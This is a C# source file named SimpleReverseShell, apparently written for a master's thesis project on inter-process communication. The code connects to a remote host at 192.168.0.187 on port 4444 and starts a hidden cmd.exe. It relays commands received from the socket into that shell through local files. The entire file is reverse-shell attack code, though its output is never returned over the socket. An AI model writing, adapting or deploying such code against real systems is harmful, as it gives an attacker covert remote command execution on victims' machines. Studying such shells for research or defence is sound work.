using System.Text;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;

namespace SimpleReverseShell
{
  public class SimpleDotNetShell
  {
    FileStream inputStream;
    StreamWriter outputStreamWriter;
    public void Start()
    {
      using (var client = new TcpClient("192.168.0.187", 4444))
      using (var networkStream = client.GetStream())
      using (inputStream = new FileStream(@"F:\FH_Technikum_Wien\Masterarbeit\IPC\input.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read))
      using (var outputStream = new FileStream(@"F:\FH_Technikum_Wien\Masterarbeit\IPC\output.txt", FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
      using (var socketReader = new StreamReader(networkStream))
      using (var inputStreamWriter = new StreamWriter(inputStream))
      using (var outputStreamReader = new StreamReader(outputStream))
      using (outputStreamWriter = new StreamWriter(outputStream))
      {
        Task.Run(StartShell);

        while (true)
        {
          var shellCommand = socketReader.ReadLine();
          if (!string.IsNullOrWhiteSpace(shellCommand))
          {
            inputStreamWriter.WriteLine(shellCommand);
            inputStreamWriter.Flush();
          }

          string formattedOutput = "";
          string output;

          do
          {
            output = outputStreamReader.ReadLine();

            if (!string.IsNullOrWhiteSpace(output))
              formattedOutput += output;
          } while (!string.IsNullOrWhiteSpace(output));
        }
      }
    }

    private void CmdOutputDataHandler(string data)
    {
      StringBuilder strOutput = new StringBuilder();

      if (!String.IsNullOrEmpty(data))
      {
        try
        {
          strOutput.Append(data);
          outputStreamWriter.WriteLine(strOutput);
          outputStreamWriter.Flush();
        }
        catch (Exception err) { }
      }
    }

    private void StartShell()
    {
      Process p = new Process();
      p.StartInfo.FileName = "C:\\Windows\\system32\\cmd.exe";
      p.StartInfo.CreateNoWindow = true;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.StartInfo.RedirectStandardInput = true;
      p.StartInfo.RedirectStandardError = false;
      p.Start();

      using (var reader = new StreamReader(inputStream))
      {
        while (true)
        {
          var shellComand = reader.ReadLine();

          if (!string.IsNullOrWhiteSpace(shellComand))
          {
            string output;
            string formattedOutput = string.Empty;

            p.StandardInput.Write(shellComand);
            do
            {
              output = p.StandardOutput.ReadLine();

              if (!string.IsNullOrWhiteSpace(output))
                formattedOutput += output;
            }
            while (!string.IsNullOrWhiteSpace(output));

            CmdOutputDataHandler(formattedOutput);
          }
        }
      }
    }
  }
}